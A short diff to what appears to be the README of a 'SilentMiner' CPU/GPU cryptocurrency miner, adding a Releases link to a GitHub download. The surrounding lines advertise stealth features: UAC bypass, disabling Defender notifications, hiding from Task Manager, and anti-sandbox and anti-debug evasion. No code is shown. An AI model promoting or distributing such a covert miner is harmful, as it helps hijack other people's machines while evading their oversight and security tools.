@@ -23,4 +23,6 @@ Copying files and their descriptions
 
 bypassUAC/disableDefenderNotifications/Hide from TaskManager/Anti-Sandbox/Debug (Stealth Mode)
 
+# Releases
 
+https://github.com/VolVeRFM/SilentMiner-CPU-GPU-VolVeR/releases/tag/Miner
